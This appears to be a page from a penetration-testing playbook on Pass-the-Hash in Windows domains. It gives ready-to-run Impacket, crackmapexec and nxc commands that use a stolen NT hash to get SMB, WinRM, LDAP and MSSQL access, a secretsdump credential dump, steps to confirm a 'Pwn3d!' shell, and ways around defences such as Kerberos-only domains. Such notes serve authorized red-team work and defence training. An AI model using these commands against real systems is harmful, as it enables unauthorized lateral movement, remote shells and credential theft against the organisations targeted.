# Pass-the-Hash (PtH)

## When this applies

- You have an NT hash (from DCSync, secretsdump, kerberoast crack, gMSA dump, LSASS dump, etc.).
- The target supports NTLM auth (NTLM not disabled on the box/domain).
- Goal: authenticate without knowing the cleartext password.

## Technique

NTLM authentication uses the NT hash directly — possessing the hash is equivalent to possessing the password. Most tools accept `-H <hash>` or `-hashes :<NThash>`.

## Steps

```bash
# Using Impacket
psexec.py -hashes :ntlmhash administrator@target

# Using CrackMapExec / nxc
crackmapexec smb target -u administrator -H ntlmhash
nxc winrm DC_IP -u Administrator -H NTHASH         # PtH → WinRM shell
nxc smb   DC_IP -u Administrator -H NTHASH         # PtH → SMB
nxc ldap  DC_IP -u Administrator -H NTHASH --query '(objectClass=user)'
nxc mssql HOST   -u sa            -H NTHASH        # works for SQL too if applicable
# All four nxc protocols accept -H. Skip the impacket → ticketer → evil-winrm dance.
```

## Verifying success

- `nxc winrm <target> -u <user> -H <NThash>` returns a successful Pwn3d! / authenticated shell.
- `secretsdump.py 'domain/user@target' -hashes :NTHASH` proceeds without password prompt.

## Common pitfalls

- NTLM may be disabled domain-wide (Kerberos-only domain) — see `kerberos-only-domain.md` for the pivot.
- Protected Users group blocks NTLM auth for those members — use Kerberos with AES keys instead.
- `nxc winrm -k` does NOT support Kerberos auth (uses pywinrm NTLM transport) — for Kerberos+WinRM, use `pypsrp` or `evil-winrm`.

## Tools

- nxc (`-H`)
- impacket `psexec.py`, `wmiexec.py`, `secretsdump.py` (`-hashes :NTHASH`)
- evil-winrm (`-H`)
- crackmapexec (`-H`)
